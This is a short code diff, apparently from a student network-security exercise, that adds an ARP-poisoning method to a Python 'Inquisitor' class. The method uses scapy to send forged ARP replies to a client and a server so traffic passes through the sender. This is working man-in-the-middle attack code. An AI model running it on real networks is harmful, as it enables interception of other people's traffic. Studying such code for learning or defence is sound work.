@@ -3,6 +3,7 @@ import argparse
 import sys
 import ipaddress
 import re
+from scapy.all import ARP, send
 
 class Inquisitor():
     def __init__(self, argument):
@@ -11,6 +12,15 @@ class Inquisitor():
         self.ip_addr_serv = argument[3]
         self.mac_addr_serv = argument[4]
         print(f"Constructor, inquisition set : {self.mac_addr_host} + {self.ip_addr_host} + {self.mac_addr_serv} + {self.ip_addr_serv}")
+
+    def send_poison(self):
+        # Lying to the client #
+        poison_client = ARP(op="2", pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv)
+        # Lying to the server #
+        poison_serv = ARP(op="2", pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host)
+        # Sending through the Network #
+        send(poison_client, verbose=False)
+        send(poison_serv, verbose=False)
 
     def verify_addr(self):
         pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
